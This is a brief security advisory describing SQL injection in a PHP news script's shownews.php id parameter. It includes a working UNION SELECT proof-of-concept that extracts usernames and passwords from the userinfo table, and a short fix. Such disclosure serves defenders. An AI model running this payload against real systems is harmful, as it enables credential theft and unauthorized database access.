SQL Injection
-------------
An attacker may execute arbitrary SQL statements on the vulnerable
system. This may compromise the integrity of your database and/or
expose sensitive information. Vulnerable variable is $nid and maybe
others.

Proof of Concept:
/phpns/shownews.php?id=1'[SQL Injection]

Shows username : pass from userinfo
/phpns/shownews.php?id=1' union select all
null,null,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),null,null,null
from userinfo/*


Solution:

Your script should filter metacharacters from user input.
